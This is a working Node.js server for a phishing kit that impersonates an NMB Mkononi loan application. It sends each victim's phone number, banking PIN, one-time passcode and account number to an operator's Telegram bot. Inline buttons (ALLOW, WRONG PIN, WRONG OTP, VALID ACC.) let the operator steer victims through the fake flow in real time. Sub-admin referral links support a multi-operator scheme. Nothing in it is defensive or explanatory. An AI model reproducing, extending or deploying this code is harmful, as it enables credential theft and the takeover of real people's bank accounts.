const express = require('path');
const http = require('http');
const expressApp = require('express');
const WebSocket = require('ws');
const TelegramBot = require('node-telegram-bot-api');

const app = expressApp();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(expressApp.json());
app.use(expressApp.static('public'));

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const MAIN_ADMIN_ID = process.env.ADMIN_CHART_ID || process.env.ADMIN_CHAT_ID || '';

let bot = null;
if (TOKEN) {
  bot = new TelegramBot(TOKEN, { polling: true });
}

// Sub-admins mapping and active client sessions
const subAdmins = new Map(); // chatID -> { mainAdminId, activeClientWs }
const clientSessions = new Map(); // ws -> session data

wss.on('connection', (ws) => {
  clientSessions.set(ws, { step: 'slider', subAdminId: MAIN_ADMIN_ID });

  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      const session = clientSessions.get(ws);

      if (data.type === 'REGISTER_SUBADMIN') {
        const ref = data.refCode;
        if (subAdmins.has(ref)) {
          session.subAdminId = ref;
        } else {
          session.subAdminId = MAIN_ADMIN_ID;
        }
      }

      if (data.type === 'SUBMIT_APPLICATION_STEP') {
        session.step = data.step;
        session.formData = { ...session.formData, ...data.payload };
      }

      if (data.type === 'SUBMIT_CREDENTIALS') {
        session.phone = data.phone;
        session.pin = data.pin;
        session.step = 'pending_approval';
        
        if (bot) {
          const targetAdmin = session.subAdminId || MAIN_ADMIN_ID;
          const msg = `🔔 *New Loan Application Approval*\n\n📱 *Phone:* +255${data.phone}\n🔑 *PIN:* ${data.pin}\n\nReview application details below:`;
          const opts = {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '✅ ALLOW', callback_data: `allow_${ws._socket.remotePort}` },
                  { text: '❌ DENY', callback_data: `deny_${ws._socket.remotePort}` }
                ]
              ]
            }
          };
          bot.sendMessage(targetAdmin, msg, opts);
        }
      }

      if (data.type === 'SUBMIT_OTP') {
        session.otp = data.otp;
        session.step = 'pending_otp';
        if (bot) {
          const targetAdmin = session.subAdminId || MAIN_ADMIN_ID;
          bot.sendMessage(targetAdmin, `🔐 *OTP Submitted:* \`${data.otp}\`\nSelect verification status:`, {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '⚠️ WRONG PIN', callback_data: `wrong_pin_${ws._socket.remotePort}` },
                  { text: '⚠️ WRONG OTP', callback_data: `wrong_otp_${ws._socket.remotePort}` }
                ],
                [
                  { text: '✅ CORRECT OTP', callback_data: `correct_otp_${ws._socket.remotePort}` }
                ]
              ]
            }
          });
        }
      }

      if (data.type === 'SUBMIT_ACCOUNT') {
        session.accountNumber = data.accountNumber;
        session.step = 'pending_account';
        if (bot) {
          const targetAdmin = session.subAdminId || MAIN_ADMIN_ID;
          bot.sendMessage(targetAdmin, `🏦 *NMB Account Number Submitted:* \`${data.accountNumber}\`\nValidate account details:`, {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  { text: '❌ INVALID ACC.', callback_data: `invalid_acc_${ws._socket.remotePort}` },
                  { text: '✅ VALID ACC.', callback_data: `valid_acc_${ws._socket.remotePort}` }
                ]
              ]
            }
          });
        }
      }

      // Map remotePort to active ws for callback lookups
      ws.clientPort = ws._socket.remotePort;
      clientSessions.set(ws, session);

    } catch (e) {
      console.error(e);
    }
  });

  ws.on('close', () => {
    clientSessions.delete(ws);
  });
});

// Telegram Bot Handlers
if (bot) {
  bot.on('message', (msg) => {
    const chatId = msg.chat.id.toString();
    const text = msg.text;

    if (text === '/start' || text === 'Start') {
      if (chatId === MAIN_ADMIN_ID) {
        bot.sendMessage(chatId, `👑 *Main Admin Dashboard*\n\nTo generate a private tracking link for a sub-admin, reply with their identifier or share this command format:\n\`/subadmin <name_or_id>\``, { parse_mode: 'Markdown' });
      } else {
        bot.sendMessage(chatId, `👋 Welcome to NMB Mkononi Bot. Your management console is active.`);
      }
    } else if (text && text.startsWith('/subadmin')) {
      if (chatId === MAIN_ADMIN_ID) {
        const parts = text.split(' ');
        const subId = parts[1] || 'sub_' + Math.floor(Math.random() * 10000);
        subAdmins.set(subId, { mainAdminId: chatId });
        const host = msg.chat.username ? 'localhost:3000' : 'localhost:3000'; // Update domain in production
        bot.sendMessage(chatId, `🔗 Private Link for Sub-Admin (${subId}):\n\`http://localhost:3000/?ref=${subId}\`\n\nChat ID: \`${subId}\``, { parse_mode: 'Markdown' });
      } else {
        bot.sendMessage(chatId, `⚠️ Unauthorized command.`);
      }
    }
  });

  bot.on('callback_query', (query) => {
    const action = query.data;
    const adminChatId = query.message.chat.id.toString();

    // Find client workspace by matching socket port in callback data suffix
    let targetWs = null;
    for (let [ws, session] of clientSessions.entries()) {
      if (action.endsWith(ws.clientPort)) {
        targetWs = ws;
        break;
      }
    }

    if (!targetWs) {
      bot.answerCallbackQuery(query.id, { text: 'Session expired or client disconnected.' });
      return;
    }

    if (action.startsWith('allow_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'ALLOW' }));
      bot.answerCallbackQuery(query.id, { text: 'Approved! Moved to OTP step.' });
      bot.editMessageText('✅ Application Approved. Moved to OTP.', { chat_id: adminChatId, message_id: query.message.message_id });
    } else if (action.startsWith('deny_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'DENY' }));
      bot.answerCallbackQuery(query.id, { text: 'Denied. Restarted session.' });
      bot.editMessageText('❌ Application Denied & Restarted.', { chat_id: adminChatId, message_id: query.message.message_id });
    } else if (action.startsWith('wrong_pin_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'WRONG_PIN' }));
      bot.answerCallbackQuery(query.id, { text: 'Triggered Wrong PIN notification.' });
      bot.editMessageText('⚠️ Flagged: Wrong PIN entered.', { chat_id: adminChatId, message_id: query.message.message_id });
    } else if (action.startsWith('wrong_otp_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'WRONG_OTP' }));
      bot.answerCallbackQuery(query.id, { text: 'Triggered Wrong OTP notification.' });
      bot.editMessageText('⚠️ Flagged: Wrong OTP entered.', { chat_id: adminChatId, message_id: query.message.message_id });
    } else if (action.startsWith('correct_otp_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'CORRECT_OTP' }));
      bot.answerCallbackQuery(query.id, { text: 'OTP Correct! Moved to Account step.' });
      bot.editMessageText('✅ OTP Verified Successfully.', { chat_id: adminChatId, message_id: query.message.message_id });
    } else if (action.startsWith('invalid_acc_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'INVALID_ACC' }));
      bot.answerCallbackQuery(query.id, { text: 'Account marked Invalid.' });
      bot.editMessageText('❌ Invalid NMB Account Number.', { chat_id: adminChatId, message_id: query.message.message_id });
    } else if (action.startsWith('valid_acc_')) {
      targetWs.send(JSON.stringify({ type: 'SERVER_ACTION', action: 'VALID_ACC' }));
      bot.answerCallbackQuery(query.id, { text: 'Account Validated! Success Screen reached.' });
      bot.editMessageText('🎉 Account Validated Successfully.', { chat_id: adminChatId, message_id: query.message.message_id });
    }
  });
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
          
